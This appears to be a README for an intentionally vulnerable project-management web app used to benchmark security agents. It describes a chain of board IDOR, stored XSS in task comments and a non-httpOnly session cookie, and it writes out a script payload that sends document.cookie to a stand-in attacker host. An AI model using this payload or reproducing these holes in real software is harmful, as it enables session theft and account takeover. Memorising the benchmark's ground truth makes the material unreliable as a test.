# App 13 — Project Management Tool

## Overview

A full-stack project tracking platform built with **Express / TypeScript** (Backend) and a decoupled client-side Single Page Application (**HTML5 + vanilla JS + CSS SPA**) served under static asset routes. The system manages team boards, user stories, action items, and organization access controls.

This application is built for security-agent benchmarking and evaluation purposes.

---

## Business Domain

**SaaS / Productivity** — Used by remote teams and enterprises to plan sprints, track deliverables, and manage cross-department collaboration.

## Tech Stack

| Layer | Technology |
|-------|------------|
| Backend | Node.js, Express, TypeScript |
| Frontend | Decoupled client-side SPA (HTML5, JS, CSS) |
| Database | In-Memory Object Store |
| Containerisation | Docker |

---

## Features

### Board Management
- Create and explore team project boards.
- Adjust board visibility and access permissions.

### Task Tracking
- Add rich-text tasks to specific project boards.
- Monitor sprint velocity and backlogs.

### Security Benchmarking

This application contains hidden, realistic vulnerabilities mapped to the OWASP Top 10 categories, designed to challenge security agents and code analysis systems.

For ground-truth details regarding the vulnerabilities, see the `.vulns` file in this directory.

---

## Chained Vulnerability Scenario

### Chain: "Board IDOR → Stored XSS in Task Comments → Session Token Exfiltration"

Three low-cost weaknesses chain from cross-organization data access into persistent account takeover.

| Step | Issue | Severity (standalone) | OWASP | Location |
|------|-------|-----------------------|-------|----------|
| 1 | `GET /api/boards/:id` does not verify the requested board belongs to the authenticated user's organization; any logged-in user can read boards and tasks from other organizations | Medium | A01 | `src/index.ts` → `GET /api/boards/:id` |
| 2 | `POST /api/boards/:boardId/tasks/:taskId/comments` stores raw comment HTML without sanitization; the stored content is returned verbatim by the GET comments endpoint and executed by any browser that renders it via `innerHTML` | Medium | A03 | `src/index.ts` → comment POST/GET handlers |
| 3 | Session cookie set without `httpOnly` flag; once XSS executes in a victim's browser, `document.cookie` is readable by JavaScript and can be exfiltrated to an attacker-controlled endpoint | Medium | A07 | `src/index.ts` → login cookie |

**Attack narrative**: The attacker logs into their own account and calls `GET /api/boards/3` (belonging to a different org) using the IDOR to read task IDs. They post a comment `<script>fetch('https://evil.com/?c='+document.cookie)</script>` to a task in that board. When a manager from the victim org views the board and their browser renders the comment via `innerHTML`, the script fires and sends the manager's `session_id` cookie (readable because `httpOnly` is absent) to the attacker. The attacker hijacks the manager session.

**Combined Impact**: Persistent cross-organization stored XSS enabling full session takeover of victim org managers.

---

## API Endpoints

| Method | Path | Auth | Description |
|--------|------|------|-------------|
| GET | `/` | — | Serves the client-side SPA portal |
| POST | `/api/auth/login` | — | Authenticates and establishes session |
| POST | `/api/auth/logout` | — | Terminates active portal session |
| GET | `/api/auth/me` | ANY | Retrieves authenticated user profile |
| GET | `/api/boards` | ANY | Retrieves all boards for the user's organization |
| GET | `/api/boards/:id` | ANY | Retrieves specific board and its tasks |
| POST | `/api/boards/:id/tasks`| ANY | Creates a new task |
| PUT | `/api/boards/:id/permissions`| ANY | Updates board permissions |

---

## Running Locally

```bash
cd apps/typescript/app-13-project-mgmt
npm install
npm run build
npm start
# Frontend served at http://localhost:8013
```

## Running via Docker

```bash
docker build -t app-13-project-mgmt .
docker run -p 8013:8013 app-13-project-mgmt
```
